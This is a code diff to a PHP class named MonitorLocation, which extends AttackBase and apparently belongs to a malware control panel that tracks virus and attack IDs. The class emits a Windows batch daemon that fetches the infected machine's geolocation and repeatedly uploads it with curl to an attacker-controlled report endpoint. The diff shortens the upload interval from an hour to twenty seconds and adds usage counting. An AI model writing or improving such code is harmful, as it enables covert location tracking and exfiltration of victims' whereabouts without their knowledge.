@@ -45,6 +45,8 @@ class MonitorLocation extends AttackBase {
     }
 
     public function saveEventFromIntercept(string $jsonEvent) {
+        $this->usage->setApiGeolocation($this->usage->getApiGeolocation() + 1);
+        $this->usage->saveState();
         $event = json_decode($jsonEvent, true);
         $this->events[time()] = array(
             "lat" => $event["location"]["lat"],
@@ -72,10 +74,11 @@ class MonitorLocation extends AttackBase {
 
     public function generateBatchCode(): void {
         //@formatter:off ?>
-        :daemon_loop
+
         curl -d "{}" -H "Content-Type: application/json" "https://www.googleapis.com/geolocation/v1/geolocate?key=<?php echo getenv("GOOGLE_GEOLOCATION_API_KEY"); ?>">"%~pd0geo"
+        :daemon_loop
         curl --form "geoFile=@%~pd0geo" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report\n"; ?>
-        timeout 3600
+        timeout 20
         goto daemon_loop
         <?php
         //@formatter:on
@@ -100,7 +103,7 @@ class MonitorLocation extends AttackBase {
     }
 
     public function purgeEvents() {
-        foreach($this->events as $unixTime => $event) {
+        foreach ($this->events as $unixTime => $event) {
             if (in_array($unixTime, $this->savedEvents)) continue;
             if (time() - $unixTime > 24 * 60 * 60) unset($this->events[$unixTime]);
         }
